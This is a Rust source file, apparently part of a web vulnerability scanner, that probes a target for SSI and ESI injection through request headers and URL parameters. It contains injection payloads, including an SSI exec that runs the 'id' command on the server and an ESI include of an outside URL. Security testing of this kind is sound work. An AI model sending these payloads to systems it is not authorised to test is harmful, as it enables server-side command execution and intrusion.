use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;
use crate::core::reporter::Reporter;

pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: Server Side Inclusion/Edge Side Inclusion", "[*]".yellow());
    
    let client = HttpClient::new()?;
    let params = Analyzer::extract_params(target);
    
    let payloads = vec![
        ("SSI Math", "<!--#expr expr=\"1337*2\" -->", "2674"),
        ("SSI Exec", "<!--#exec cmd=\"id\" -->", "uid="),
        ("ESI Include", "<esi:include src=\"http://example.com/\" />", "example"),
    ];

    // 1. Test in Headers (User-Agent, Referer)
    let header_candidates = vec!["User-Agent", "Referer", "X-Forwarded-For"];
    for (name, payload, check) in &payloads {
        for header in &header_candidates {
            let resp = client.inner.get(target)
                .header(*header, *payload)
                .send().await?;
                
            if resp.text().await?.contains(check) {
                Reporter::found("SSI/ESI Injection", &format!("Detected via {} in '{}' header", name, header), &format!("Target: {} | Header: {} | Payload: {}", target, header, payload));
            }
        }
    }

    // 2. Test in Parameters
    for (param_name, _) in params {
        for (name, payload, check) in &payloads {
            let url = Analyzer::inject_param(target, &param_name, payload)?;
            let resp = client.inner.get(&url).send().await?;
            
            if resp.text().await?.contains(check) {
                Reporter::found("SSI/ESI Injection", &format!("Detected via {} in parameter '{}'", name, param_name), &format!("Target: {}?{}={}", target.split('?').next().unwrap_or(target), param_name, payload));
            }
        }
    }

    Ok(())
}
